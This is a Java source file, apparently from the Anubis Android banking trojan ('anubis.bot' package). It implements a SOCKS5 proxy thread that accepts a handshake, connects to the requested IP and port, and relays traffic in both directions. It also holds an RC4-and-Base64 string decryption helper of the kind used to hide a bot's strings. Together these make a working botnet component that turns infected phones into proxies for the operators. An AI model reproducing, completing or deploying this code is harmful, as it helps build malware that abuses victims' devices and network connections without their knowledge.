package anubis.bot.myapplication.socks;

import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;


public class ServerThread implements Runnable {

    private Socket socket;
    private String TAG = this.getClass().getName();
    private int BUFF_SIZE = 1024 * 100;

    public ServerThread(Socket socket) {
        this.socket = socket;
    }
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    public void run() {
        try {
            InputStream innerInputStream = socket.getInputStream();
            OutputStream innerOutputStream = socket.getOutputStream();
            byte[] buff = new byte[BUFF_SIZE];
            int rc;
            ByteArrayOutputStream byteArrayOutputStream;


            innerInputStream.read(buff, 0, 3);


            byte[] firstAckMessage = new byte[]{5, 0};
            byte[] secondAckMessage = new byte[10];
            innerOutputStream.write(firstAckMessage);
            innerOutputStream.flush();


            innerInputStream.read(buff, 0, 10);

            String IP = byte2int(buff[4]) + "." + byte2int(buff[5]) + "." + byte2int(buff[6]) + "." + byte2int(buff[7]);
            int port = byte2int(buff[8]) * 256 + byte2int(buff[9]);

            Log.e("ServerThread", "Connected to " + IP + ":" + port);
            Socket outerSocket = new Socket(IP, port);
            InputStream outerInputStream = outerSocket.getInputStream();
            OutputStream outerOutputStream = outerSocket.getOutputStream();


            byte ip1[] = new byte[4];
            int port1 = 0;
            ip1 = outerSocket.getLocalAddress().getAddress();
            port1 = outerSocket.getLocalPort();

            secondAckMessage[0] = 5;
            secondAckMessage[1] = 0;
            secondAckMessage[2] = 0;
            secondAckMessage[3] = 1;
            secondAckMessage[4] = ip1[0];
            secondAckMessage[5] = ip1[1];
            secondAckMessage[6] = ip1[2];
            secondAckMessage[7] = ip1[3];
            secondAckMessage[8] = (byte) (port1 >> 8);
            secondAckMessage[9] = (byte) (port1 & 0xff);
            innerOutputStream.write(secondAckMessage, 0, 10);
            innerOutputStream.flush();


            SocksResponseThread responseThread = new SocksResponseThread(outerInputStream, innerOutputStream);
            responseThread.start();


            byteArrayOutputStream = new ByteArrayOutputStream();
            while ((rc = innerInputStream.read(buff, 0, BUFF_SIZE)) > 0) {
                outerOutputStream.write(buff, 0, rc);
                byteArrayOutputStream.write(buff, 0, rc);
                outerOutputStream.flush();
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (socket != null) socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }
    public int byte2int(byte b) {
        return b & 0xff;
    }
}